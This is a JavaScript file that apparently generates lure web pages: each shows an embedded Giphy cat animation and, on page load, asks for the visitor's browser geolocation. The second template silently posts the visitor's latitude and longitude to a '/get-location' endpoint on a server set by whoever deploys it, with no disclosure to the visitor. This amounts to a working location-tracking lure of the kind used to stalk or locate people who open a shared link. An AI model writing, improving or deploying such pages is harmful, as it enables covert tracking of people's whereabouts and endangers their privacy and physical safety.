export const body = (model)=>{
 return ` 
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body onload="getLocation()">

 <div style="width:480px"><iframe allow="fullscreen" frameBorder="0" height="480" src="https://giphy.com/embed/GvkQ4VFFS2vrYzaAfO/video" width="480"></iframe></div> 

     <p id="demo"></p>

     <script>

         function getLocation() {
            if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
         } else { 
          document.getElementById("demo").innerHTML =
          "Geolocation is not supported by this browser.";
         } 
           }
       
        function showPosition(position) {
          document.getElementById("demo").innerHTML =
          "Latitude: " + position.coords.latitude + "<br>" +
          "Longitude: " + position.coords.longitude;
         } 
        </script>    
</body>
</html>
  `    
}





export const getHomepage = (url)=>{
  return `
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
 
   </head>
   <body  onload="getLocation(callback) "  >
 
     <iframe src="https://giphy.com/embed/LHZyixOnHwDDy" width="480" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/computer-working-cat-LHZyixOnHwDDy">via GIPHY</a></p>
       <!-- <img src="./giphy.gif"  /> -->
 
       
 <p id="demo"></p>
 
       <script>
 
          var  lt;
           var lg;  
         
          function getLocation(callback){
               if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition )
            } 
           }
         
            async function showPosition(position) {
              
              console.log("ld , lg " ,position.coords.longitude  , position.coords.latitude);
              lt=  position.coords.latitude
              lg=  position.coords.longitude
              callback()
           }
 
           function callback(){
        
         
             fetch('${url}/get-location' , 
                   {
         method: 'post',
         headers: {
           'Content-Type': 'application/json' 
         },
         body: 
         JSON.stringify({
           lg:lg,lt:lt}),
       }
        
 ).then(res=>{
      console.log('====================================');
      console.log("res" , res);
      console.log('====================================');
     }).catch(err=>{
        console.log(err);
        })
 
 
           }
 
 
 
         
           </script>
 
 
       
   </body>
   </html>

   
    ` 

}